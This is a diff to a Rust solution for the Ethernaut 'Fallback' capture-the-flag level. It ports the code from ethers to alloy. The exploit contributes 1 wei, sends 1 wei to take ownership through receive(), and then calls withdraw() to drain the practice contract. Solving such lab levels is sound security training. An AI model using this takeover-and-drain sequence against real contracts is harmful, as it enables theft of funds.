@@ -1,9 +1,9 @@
+use alloy::primitives::U256;
 use async_trait::async_trait;
+use ctf::Actor;
 use ctf::ethernaut::lvl01_fallback::*;
-use ethers::prelude::*;
 
-pub(crate) struct Exploit;
-
+pub struct Exploit;
 #[async_trait]
 impl ctf::Exploit for Exploit {
     type Target = Target;
@@ -11,24 +11,32 @@ impl ctf::Exploit for Exploit {
     async fn attack(
         self,
         target: &Self::Target,
-        offender: &ctf::Actor,
+        offender: &Actor,
     ) -> eyre::Result<()> {
-        let contract = Fallback::new(target.address, offender.clone());
+        let contract =
+            Fallback::new(target.address, offender.provider().clone());
 
         println!("Calling contribute()...");
-        contract.contribute().value(1).send().await?.await?;
-
-        println!("Calling receive()...");
-        offender
-            .send_transaction(
-                TransactionRequest::new().to(contract.address()).value(1),
-                None,
-            )
+        contract
+            .contribute()
+            .value(U256::from(1))
+            .from(offender.address())
+            .send()
             .await?
+            .watch()
             .await?;
 
+        println!("Calling receive()...");
+        offender.transfer(target.address, U256::from(1)).await?;
+
         println!("Calling withdraw()...");
-        contract.withdraw().send().await?.await?;
+        contract
+            .withdraw()
+            .from(offender.address())
+            .send()
+            .await?
+            .watch()
+            .await?;
 
         Ok(())
     }
